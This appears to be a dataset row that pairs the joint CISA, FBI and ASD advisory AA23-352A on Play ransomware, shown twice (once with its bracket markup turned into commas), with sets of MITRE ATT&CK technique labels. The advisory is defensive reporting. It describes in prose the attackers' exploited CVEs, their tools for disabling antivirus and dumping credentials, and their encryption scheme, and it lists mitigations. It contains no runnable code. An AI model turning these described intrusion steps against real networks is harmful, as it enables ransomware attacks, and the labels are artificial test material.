","['T1070', 'T1588', 'T1550', 'T1553', 'T1482', 'T1185', 'T1518', 'T1598', 'T1020', 'T1102', 'T1119', 'T1566', 'T1048', 'T1531', 'T1562', 'T1587', 'T1213']","{'T1588.002', 'T1033', 'T1057', 'T1136.001', 'T1111', 'T1030', 'T1136.002', 'T1585.002', 'T1218', 'T1567.002', 'T1003.006', 'T1562.001', 'T1219', 'T1027', 'T1562.002', 'T1070.001', 'T1588.006', 'T1657', 'T1070.004', 'T1211', 'T1597.001', 'T1656', 'T1556.006', 'T1591', 'T1534', 'T1486', 'T1598.003', 'T1585', 'T1553.006', 'T1518.001'}","{'T1588.002', 'T1589', 'T1136.001, T1136.002, T1136.003', 'T1518.001', 'T1057', 'T1111', 'T1030', 'T1016', 'T1566.001', 'T1070.006', 'T1082', 'T1531', 'T1585.002', 'T1218', 'T1567.002', 'T1003.006', 'T1597', 'T1562.001', 'T1219', 'T1223', 'T1027', 'T1070.005', 'T1070.003', 'T1562.002', 'T1219, T1572', 'T1580', 'T1588.006', 'T1480.001', 'T1657', 'T1070.004', 'T1211', 'T1597.001', 'T1656', 'T1556.006', 'T1534', 'T1486', 'T1598.003', 'T1027.005', 'T1585', 'T1553.006', 'T1136.001, T1558.003', 'T1033, T1057'}","{'T1070', 'T1003, T1078, T1070, T1021', 'T1589', 'T1486, T1567', 'T1136', 'T1212', 'T1111', 'T1105, T1219', 'T1557, T1078, T1556', 'T1049, T1016, T1480', 'T1583', 'T1646', 'T1204', 'T1003, T1033, T1049', 'T1598, T1566', 'T1218', 'T1499', 'T1485', 'T1203', 'T1598', 'T1076', 'T1027', 'T1219, T1021', 'T1566', 'T1567', 'T1136, T1558', 'T1071', 'T1556', 'T1486, T1485', 'T1591', 'T1202', 'T1572, T1090', 'T1486', 'T1210', 'T1566, T1621, T1589', 'T1562', 'T1040, T1071, T1569'}"
6,https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-352a,"






Actions to take today to mitigate cyber threats from Play ransomware:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Regularly patch and update software and applications to their latest versions and conduct regular vulnerability assessments.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing this joint CSA to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations as recently as October 2023.
Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. As of October 2023, the FBI was aware of approximately 300 affected entities allegedly exploited by the ransomware actors.
In Australia, the first Play ransomware incident was observed in April 2023, and most recently in November 2023.
The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of deals,” according to a statement on the group’s data leak website. Play ransomware actors employ a double-extortion model, encrypting systems after exfiltrating data. Ransom notes do not include an initial ransom demand or payment instructions, rather, victims are instructed to contact the threat actors via email.
The FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. This includes requiring multifactor authentication, maintaining offline backups of data, implementing a recovery plan, and keeping all operating systems, software, and firmware up to date.
Download a PDF version of this report:


AA23-352A #StopRansomware: Play Ransomware
(PDF,       536.19 KB
  )


For a downloadable copy of IOCs, see:


AA23-352A STIX XML
(XML,       34.87 KB
  )




AA23-352A STIX JSON
(JSON,       30.22 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK for Enterprise section for all referenced tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
The Play ransomware group gains initial access to victim networks through the abuse of valid accounts [T1078] and exploitation of public-facing applications [T1190], specifically through known FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange (ProxyNotShell [CVE-2022-41040 and CVE-2022-41082]) vulnerabilities. Play ransomware actors have been observed to use external-facing services [T1133] such as Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.
Discovery and Defense Evasion
Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba [1], an information-stealer, to enumerate network information [T1016] and scan for anti-virus software [T1518.001]. Actors also use tools like GMER, IOBit, and PowerTool to disable anti-virus software [T1562.001] and remove log files [T1070.001]. In some instances, cybersecurity researchers have observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.[2]
Lateral Movement and Execution
Play ransomware actors use command and control (C2) applications, including Cobalt Strike and SystemBC, and tools like PsExec, to assist with lateral movement and file execution. Once established on a network, the ransomware actors search for unsecured credentials [T1552] and use the Mimikatz credential dumper to gain domain administrator access [T1003]. According to open source reporting [2], to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS) [T1059] to search for additional privilege escalation paths. Actors then distribute executables [T1570] via Group Policy Objects [T1484.001].
Exfiltration and Encryption
Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files [T1560.001] into .RAR format for exfiltration. The actors then use WinSCP to transfer data [T1048] from a compromised network to actor-controlled accounts. Following exfiltration, files are encrypted [T1486] with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes. [3] (Note: System files are skipped during the encryption process.) A .play extension is added to file names and a ransom note titled ReadMe[.]txt is placed in file directory C:.
Impact
The Play ransomware group uses a double-extortion model [T1657], encrypting systems after exfiltrating data. The ransom note directs victims to contact the Play ransomware group at an email address ending in @gmx[.]de. Ransom payments are paid in cryptocurrency to wallet addresses provided by Play actors. If a victim refuses to pay the ransom demand, the ransomware actors threaten to publish exfiltrated data to their leak site on the Tor network ([.]onion URL).
Leveraged Tools
Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. The legitimate tools listed in this product are all publicly available. Use of these tools and applications should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.

Table 1: Tools Leveraged by Play Ransomware Actors


Name
Description




AdFind
Used to query and retrieve information from Active Directory.


Bloodhound
Used to query and retrieve information from Active Directory.


GMER
A software tool intended to be used for detecting and removing rootkits.


IOBit
An anti-malware and anti-virus program for the Microsoft Windows operating system. Play actors have accessed IOBit to disable anti-virus software.


PsExec
A tool designed to run programs and execute commands on remote systems.


PowerTool
A Windows utility designed to improve speed, remove bloatware, protect privacy, and eliminate data collection, among other things.


PowerShell
A cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.


Cobalt Strike
A penetration testing tool used by security professionals to test the security of networks and systems. Play ransomware actors have used it to assist with lateral movement and file execution.


Mimikatz
Allows users to view and save authentication credentials such as Kerberos tickets. Play ransomware actors have used it to add accounts to domain controllers.


WinPEAS
Used to search for additional privilege escalation paths.


WinRAR
Used to split compromised data into segments and to compress files into .RAR format for exfiltration.


WinSCP
Windows Secure Copy is a free and open-source Secure Shell (SSH) File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Play ransomware actors have used it to transfer data [T1048] from a compromised network to actor-controlled accounts.


Microsoft Nltest
Used by Play ransomware actors for network discovery.


Nekto / PriviCMD
Used by Play ransomware actors for privilege escalation.


Process Hacker
Used to enumerate running processes on a system.


Plink
Used to establish persistent SSH tunnels.



Indicators of Compromise
See Table 2 for Play ransomware IOCs obtained from FBI investigations as of October 2023.

Table 2: Hashes Associated with Play Ransomware Actors


Hashes (SHA256)
Description




453257c3494addafb39cb6815862403e827947a1e7737eb8168cd10522465deb
Play ransomware custom data gathering tool


47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57
Play ransomware encryptor


75404543de25513b376f097ceb383e8efb9c9b95da8945fd4aa37c7b2f226212
SystemBC malware EXE


7a42f96599df8090cf89d6e3ce4316d24c6c00e499c8557a2e09d61c00c11986
SystemBC malware DLL


7a6df63d883bbccb315986c2cfb76570335abf84fafbefce047d126b32234af8
Play ransomware binary


7dea671be77a2ca5772b86cf8831b02bff0567bce6a3ae023825aa40354f8aca
SystemBC malware DLL


c59f3c8d61d940b56436c14bc148c1fe98862921b8f7bad97fbc96b31d71193c
Play network scanner


e652051fe47d784f6f85dc00adca1c15a8c7a40f1e5772e6a95281d8bf3d5c74
Play ransomware binary


e8d5ad0bf292c42a9185bb1251c7e763d16614c180071b01da742972999b95da
Play ransomware binary



MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 3–Table 11 for all referenced threat actor tactics and techniques in this advisory.

Table 3: Play ATT&CK Techniques for Enterprise for Initial Access


Technique Title
ID
Use




Valid Accounts
T1078
Play ransomware actors obtain and abuse existing account credentials to gain initial access.


Exploit Public Facing Application
T1190
Play ransomware actors exploit vulnerabilities in internet-facing systems to gain access to networks.


External Remote Services
T1133
Play ransomware actors have used remote access services, such as RDP/VPN connection to gain initial access.




Table 4: Play ATT&CK Techniques for Enterprise for Discovery


Technique Title
ID
Use




System Network Configuration Discovery
T1016
Play ransomware actors use tools like Grixba to identify network configurations and settings.


Software Discovery: Security Software Discovery
T1518.001
Play ransomware actors scan for anti-virus software.




Table 5: Play ATT&CK Techniques for Enterprise for Defense Evasion


Technique Title
ID
Use




Impair Defenses: Disable or Modify Tools
T1562.001
Play ransomware actors use tools like GMER, IOBit, and PowerTool to disable anti-virus software.


Indicator Removal: Clear Windows Event Logs
T1070.001
Play ransomware actors delete logs or other indicators of compromise to hide intrusion activity.




Table 6: Play ATT&CK Techniques for Enterprise for Credential Access


Technique Title
ID
Use




Unsecured Credentials
T1552
Play ransomware actors attempt to identify and exploit credentials stored unsecurely on a compromised network.


OS Credential Dumping
T1003
Play ransomware actors use tools like Mimikatz to dump credentials.




Table 7: Play ATT&CK Techniques for Enterprise for Lateral Movement


Technique Title
ID
Use




Lateral Tool Transfer
T1570
Play ransomware actors distribute executables within the compromised environment.




Table 8: Play ATT&CK Techniques for Enterprise for Command and Control


Technique Title
ID
Use




Domain Policy Modification: Group Policy Modification
T1484.001
Play ransomware actors distribute executables via Group Policy Objects.




Table 9: Play ATT&CK Techniques for Enterprise for Collection


Technique Title
ID
Use




Archive Collected Data: Archive via Utility
T1560.001
Play ransomware actors use tools like WinRAR to compress files.




Table 10: Play ATT&CK Techniques for Enterprise for Exfiltration


Technique Title
ID
Use




Exfiltration Over Alternative Protocol
T1048
Play ransomware actors use file transfer tools like WinSCP to transfer data.




Table 11: Play ATT&CK Techniques for Enterprise for Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
Play ransomware actors encrypt data on target systems to interrupt availability to system and network resources.


Financial Theft
T1657
Play ransomware actors use a double-extortion model for financial gain.



MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and ASD’s ACSC recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of ransomware techniques (such as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the security posture for their customers.For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI, CISA, and ASD’s ACSC recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Play ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers [CPG 2.F, 2.R, 2.S] in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST’s standards for developing and managing password policies [CPG 2.C].

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length [CPG 2.B];
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts [CPG 2.G];
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication [CPG 2.H] for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. Also see Protect Yourself: Multi-Factor Authentication | Cyber.gov.au.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E]. Organizations are advised to deploy the latest Microsoft Exchange security updates. If unable to patch, then disable Outlook Web Access (OWA) until updates are able to be undertaken. Also see Patching Applications and Operating Systems | Cyber.gov.au.
Segment networks [CPG 2.F] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Also see Implementing Network Segmentation and Segregation.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network [CPG 1.E]. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Filter network traffic by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents actors from directly connecting to remote access services they have established for persistence. Also see Inbound Traffic Filtering – Technique D3-ITF.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts [CPG 1.A, 2.O].
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 2.E].
Disable unused ports [CPG 2.V].
Consider adding an email banner to emails [CPG 2.M] received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privileged escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [CPG 2.E].
Maintain offline backups of data and regularly maintain backup and restoration [CPG 2.R]. By instituting this practice, an organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure [CPG 2.K].

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and ASD’s ACSC recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and ASD’s ACSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-11).
Align your security technologies against this technique.
Test your technologies against this technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and ASD’s ACSC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Play ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and ASD’s ACSC do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, the FBI’s Internet Crime Complaint Center (IC3), or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.
REFERENCES
[1] Symantec: Play Ransomware Group Using New Custom Data-Gathering Tools[2] TrendMicro: Play Ransomware Spotlight[3] SentinelLabs: Ransomware Developers Turn to Intermittent Encryption to Evade Detection






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1059', 'T1190', 'T1003', 'T1560.001', 'T1518.001', 'T1562.001', 'T1484.001', 'T1486', 'T1657', 'T1570', 'T1133', 'T1552', 'T1070.001', 'TA0007', 'T1048', 'T1078', 'T1016'}","






Actions to take today to mitigate cyber threats from Play ransomware:




Prioritize remediating known exploited vulnerabilities.
Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems.
Regularly patch and update software and applications to their latest versions and conduct regular vulnerability assessments.







SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD's ACSC) are releasing this joint CSA to disseminate the Play ransomware group’s IOCs and TTPs identified through FBI investigations as recently as October 2023.
Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe. As of October 2023, the FBI was aware of approximately 300 affected entities allegedly exploited by the ransomware actors.
In Australia, the first Play ransomware incident was observed in April 2023, and most recently in November 2023.
The Play ransomware group is presumed to be a closed group, designed to “guarantee the secrecy of deals,” according to a statement on the group’s data leak website. Play ransomware actors employ a double-extortion model, encrypting systems after exfiltrating data. Ransom notes do not include an initial ransom demand or payment instructions, rather, victims are instructed to contact the threat actors via email.
The FBI, CISA, and ASD’s ACSC encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. This includes requiring multifactor authentication, maintaining offline backups of data, implementing a recovery plan, and keeping all operating systems, software, and firmware up to date.
Download a PDF version of this report:


AA23-352A #StopRansomware: Play Ransomware
(PDF,       536.19 KB
  )


For a downloadable copy of IOCs, see:


AA23-352A STIX XML
(XML,       34.87 KB
  )




AA23-352A STIX JSON
(JSON,       30.22 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK for Enterprise section for all referenced tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
The Play ransomware group gains initial access to victim networks through the abuse of valid accounts, and exploitation of public-facing applications, specifically through known FortiOS (CVE-2018-13379 and CVE-2020-12812) and Microsoft Exchange (ProxyNotShell,CVE-2022-41040 and CVE-2022-41082,) vulnerabilities. Play ransomware actors have been observed to use external-facing services, such as Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access.
Discovery and Defense Evasion
Play ransomware actors use tools like AdFind to run Active Directory queries, and Grixba,1, an information-stealer, to enumerate network information, and scan for anti-virus software,. Actors also use tools like GMER, IOBit, and PowerTool to disable anti-virus software, and remove log files,. In some instances, cybersecurity researchers have observed Play ransomware actors using PowerShell scripts to target Microsoft Defender.,2,
Lateral Movement and Execution
Play ransomware actors use command and control (C2) applications, including Cobalt Strike and SystemBC, and tools like PsExec, to assist with lateral movement and file execution. Once established on a network, the ransomware actors search for unsecured credentials, and use the Mimikatz credential dumper to gain domain administrator access,. According to open source reporting,2, to further enumerate vulnerabilities, Play ransomware actors use Windows Privilege Escalation Awesome Scripts (WinPEAS), to search for additional privilege escalation paths. Actors then distribute executables, via Group Policy Objects,.
Exfiltration and Encryption
Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files, into .RAR format for exfiltration. The actors then use WinSCP to transfer data, from a compromised network to actor-controlled accounts. Following exfiltration, files are encrypted, with AES-RSA hybrid encryption using intermittent encryption, encrypting every other file portion of 0x100000 bytes.,3, (Note: System files are skipped during the encryption process.) A .play extension is added to file names and a ransom note titled ReadMe,.,txt is placed in file directory C:.
Impact
The Play ransomware group uses a double-extortion model, encrypting systems after exfiltrating data. The ransom note directs victims to contact the Play ransomware group at an email address ending in @gmx,.,de. Ransom payments are paid in cryptocurrency to wallet addresses provided by Play actors. If a victim refuses to pay the ransom demand, the ransomware actors threaten to publish exfiltrated data to their leak site on the Tor network (,.,onion URL).
Leveraged Tools
Table 1 lists legitimate tools Play ransomware actors have repurposed for their operations. The legitimate tools listed in this product are all publicly available. Use of these tools and applications should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.

Indicators of Compromise
See Table 2 for Play ransomware IOCs obtained from FBI investigations as of October 2023.

MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 3–Table 11 for all referenced threat actor tactics and techniques in this advisory.









MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders. The FBI, CISA, and ASD’s ACSC recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of ransomware techniques (such as threat actors leveraging backdoor vulnerabilities into remote software systems), thus, strengthening the security posture for their customers.For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The FBI, CISA, and ASD’s ACSC recommend organizations apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Play ransomware. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats and TTPs. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers,CPG 2.F, 2.R, 2.S, in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST’s standards for developing and managing password policies,CPG 2.C,.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length,CPG 2.B,;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts,CPG 2.G,;
Disable password “hints”;
Refrain from requiring password changes more frequently than once per year.Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.
Require administrator credentials to install software.


Require multifactor authentication,CPG 2.H, for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. Also see Protect Yourself: Multi-Factor Authentication | Cyber.gov.au.
Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,. Organizations are advised to deploy the latest Microsoft Exchange security updates. If unable to patch, then disable Outlook Web Access (OWA) until updates are able to be undertaken. Also see Patching Applications and Operating Systems | Cyber.gov.au.
Segment networks,CPG 2.F, to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Also see Implementing Network Segmentation and Segregation.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network,CPG 1.E,. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Filter network traffic by preventing unknown or untrusted origins from accessing remote services on internal systems. This prevents actors from directly connecting to remote access services they have established for persistence. Also see Inbound Traffic Filtering – Technique D3-ITF.
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts,CPG 1.A, 2.O,.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege,CPG 2.E,.
Disable unused ports,CPG 2.V,.
Consider adding an email banner to emails,CPG 2.M, received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.
Disable command-line and scripting activities and permissions. Privileged escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally,CPG 2.E,.
Maintain offline backups of data and regularly maintain backup and restoration,CPG 2.R,. By instituting this practice, an organization ensures they will not be severely interrupted, and/or only have irretrievable data.
Ensure backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure,CPG 2.K,.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, the FBI, CISA, and ASD’s ACSC recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI, CISA, and ASD’s ACSC recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 3-11).
Align your security technologies against this technique.
Test your technologies against this technique.
Analyze your detection and prevention technologies performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI, CISA, and ASD’s ACSC recommend continually testing your security program at scale and in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: #StopRansomware Guide.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with Play ransomware actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
The FBI, CISA, and ASD’s ACSC do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, the FBI’s Internet Crime Complaint Center (IC3), or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD's ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and the FBI do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA or the FBI.
REFERENCES,1, Symantec: Play Ransomware Group Using New Custom Data-Gathering Tools,2, TrendMicro: Play Ransomware Spotlight,3, SentinelLabs: Ransomware Developers Turn to Intermittent Encryption to Evade Detection






This product is provided subject to this Notification and this Privacy & Use policy.


